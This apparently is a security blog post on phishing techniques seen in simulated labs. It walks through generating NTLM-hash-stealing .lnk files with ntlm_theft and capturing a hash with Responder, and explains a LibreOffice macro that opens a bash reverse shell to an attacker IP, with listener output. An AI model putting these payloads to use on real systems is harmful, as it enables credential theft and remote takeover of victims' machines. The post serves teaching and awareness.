+++
title = "Bait, Hook, and Hack"
description = "Few tactics and techniques behind phishing attacks i have came accrossed in simulated labs xD"
date = 2024-09-07T07:40:10+01:00
weight = 4
+++

Phishing is like fishing with a twist—except instead of catching fish, you're trying to reel in sensitive information. Cybercriminals use cunning tactics to craft emails and websites that look all too real, hoping you'll bite. In this post, we're going to break down the phishing process from the initial bait to the final hook. You'll learn how these attacks are set up, how to spot them, and what you can do to protect yourself.

![](https://i.pinimg.com/originals/69/d8/57/69d857971d2740bad7ba184aa1ffc52e.gif#center)

In my simulated lab experiences, I’ve encountered several phishing scenarios that highlight the sophistication of these attacks. From deceptive emails that mimic trusted sources to cleverly disguised phishing websites, these examples offer valuable insights into how attackers operate. Understanding these tactics not only helps in recognizing potential threats but also enhances your ability to defend against them effectively.



## **Scenario 1 : Linking to Trouble**


In this scenario, we delve into the art of crafting a seemingly innocent `.lnk` file, but with a malicious twist. Our approach involves creating a `.lnk` file designed to exploit vulnerabilities in the Windows environment. We start by creating this file with the following tool called "[`ntlm_theft`](https://github.com/Greenwolf/ntlm_theft.git)" created by ***Green Wolf***.



![](https://i.imgur.com/NhM27Ou.png)



```bash
############ Command Breakdown ##############
# -g: generate all file formats
# -s: IP SMB hash capture server (Responder, smbserver.py)
# -f: Base filename without extension

python3 ntlm_theft.py -g all -s 10.11.69.221 -f secfortress
```



Once this nefarious file is crafted and uploaded to a shared SMB location, it awaits an unsuspecting victim. When the user interacts with the file, it silently triggers a process that captures and returns their NTLM hash. Before deploying our malicious `.lnk` file, it’s crucial to ensure that we have the necessary write access to an SMB share, or an alternative method for file transfer such as `FTP` or `IMAP`.


![](https://i.imgur.com/TsEKR40.png)


> As demonstrated, ensuring that a user (with malicious intent) has write access to an SMB share is crucial for delivering a valid payload. This access allows the attacker to upload the malicious `.lnk` file to the share. However, this scenario isn't always straightforward. In some trusted environments, users may be granted extensive privileges, including the ability to upload files to areas that are implicitly trusted. Consequently, files uploaded to these locations are often accepted without scrutiny, making them prime targets for exploitation. This highlights the importance of monitoring and restricting file uploads in trusted areas to mitigate potential risks.


![](https://i.imgur.com/lDlpwrP.png#center)



We can then intercept this valuable hash, opening the door to further exploitation. This technique highlights the power of seemingly benign files and the critical importance of vigilance against such subtle threats. By understanding and simulating these attacks, you gain insight into the sophisticated methods attackers use to compromise systems and the steps you can take to defend against them.



```bash
❯ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]

--SNIP--

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 192.168.165.30
[SMB] NTLMv2-SSP Username : REDACTED\Tracy.White
[SMB] NTLMv2-SSP Hash     : Tracy.White::REDACTED:9bbf8934331a4560:7E3E7EB81FF46C2022052D262FF86FED:0101000000000000804E1194E3EEDA012C0D0C83CBDD665900000000020008004F0031003400450001001E00570
049004E002D004300420041003200580050004B00420052005500300004003400570049004E002D004300420041003200580050004B0042005200550030002E004F003100340045002E004C004F00430041004C00030014004F00310034004
5002E004C004F00430041004C00050014004F003100340045002E004C004F00430041004C0007000800804E1194E3EEDA0106000400020000000800300030000000000000000100000000200000452F70F2B66A34630BD52340E899C3B9A07
2F2D5A53D205FCBB235EA806B7FB60A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200330035000000000000000000
[*] Skipping previously captured hash for REDACTED\Tracy.White
```


## **Scenario 2 : Macro Mayhem**

We’ve seen a surge in `VBS` macro-based attacks recently, such as **CVE-2023-23399** and **CVE-2023-28311**, which have exploited vulnerabilities in common office software. In this section, we'll provide a quick guide on how to manually generate similar malicious macros. From embedding them into documents using tools like LibreOffice or Microsoft Excel, to executing them on a target system for a potential reverse shell.

Below is a short example of crafting a malicious macro in LibreOffice, designed to open a reverse shell to a remote attacker:

{{< drive id="1eht1kZT8IVZF5-2AWZnSfPAz2EACGEJq" type="preview" >}}


 **Breaking Down the Macro**

- **`REM ***** BASIC *****`**: This line denotes the beginning of a macro script written in LibreOffice BASIC, which is a scripting language similar to Visual Basic for Applications (VBA).

- **`Sub Main`**: Defines the start of the macro subroutine named "Main." This is where the script begins execution when triggered.

- **`shell(...)`**: This command executes a shell command on the target system. Here, it uses the `bash` shell to initiate a reverse shell connection.

- **`bash -c 'bash -i >& /dev/tcp/192.168.0.158/4444 0>&1'`**: This is the core payload. It runs a bash command that creates an interactive reverse shell, sending input and output to the attacker's IP (`192.168.0.158`) over TCP port `4444`. When executed, it effectively gives the attacker remote control of the target system.

- **`End Sub`**: Marks the end of the macro subroutine.

Getting a reverse shell is as simple as sending the malicious `.odt` file to your unsuspecting colleague who "clicks everything," and waiting for them to open it. Once they do, the reverse shell pops on the attacker's listener, as long as the target uses Bash or any Linux OS.


![](https://i.imgur.com/6oBaIwd.png#center)


By embedding this macro into a document and enticing the target to enable macros upon opening, the attacker can establish a reverse shell, gaining unauthorized access to the target system. This example highlights how easy it is to weaponize common office documents, and it underscores the importance of exercising caution with any files that prompt you to enable macros.


```bash
❯ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.0.158 33474
bash: cannot set terminal process group (1654): Inappropriate ioctl for device
bash: no job control in this shell
sec-fortress@Pwn-F0rk-3X3C:~$ whoami
whoami
sec-fortress
```

## **Closing the Net!**


![](https://i.pinimg.com/originals/fb/7d/81/fb7d811ce69c58730714a38ede4d4d3e.gif#center)

As we close the chapter on phishing, remember that staying one step ahead of cyber criminals is key. From sneaky `.lnk` files to crafty macros, these attacks exploit human trust and technical vulnerabilities. By understanding these methods, you can better protect yourself and your organization. Always be cautious with unexpected files and links, and never hesitate to verify their legitimacy. With awareness and vigilance, you can turn the tables on these digital predators and keep your information secure. Stay alert, stay informed, and keep phishing at bay! 

**Take note that this is based on my experiences in simulated labs, and there are many more phishing techniques out there. The landscape of phishing is constantly evolving, so staying updated and informed is crucial.**


## **Resources**


- [Phishing methodology](https://book.hacktricks.xyz/generic-methodologies-and-resources/phishing-methodology)
